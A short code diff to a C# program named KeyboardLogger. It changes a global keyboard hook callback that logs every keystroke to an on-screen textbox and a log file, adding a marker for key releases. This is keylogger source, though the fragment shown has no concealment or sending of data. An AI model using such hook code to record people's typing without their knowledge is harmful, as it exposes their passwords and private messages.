@@ -54,8 +54,9 @@ namespace KeyboardLogger
             if (code >= 0)
             {
                 Keys key = (Keys)lParam.vkCode;
-                textBox_Log.Text = textBox_Log.Text + key + " ";
-                log.Write(key + " ");
+                string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP)? key + "- " : key + " ";
+                textBox_Log.Text = textBox_Log.Text + txt;
+                log.Write(txt);
             }
             return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
